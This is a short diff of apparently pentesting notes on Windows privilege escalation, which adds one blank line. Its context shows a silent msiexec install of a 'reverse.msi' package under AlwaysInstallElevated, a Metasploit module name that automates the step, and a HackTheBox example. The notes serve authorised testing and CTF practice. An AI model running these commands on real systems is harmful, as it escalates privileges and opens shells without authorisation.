@@ -54,4 +54,5 @@ or
 > msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
 ```
 If you have a meterpreter session you can automate this technique using the module **`exploit/windows/local/always_install_elevated`**
+
 *See an example at the Love machine - hackthebox*
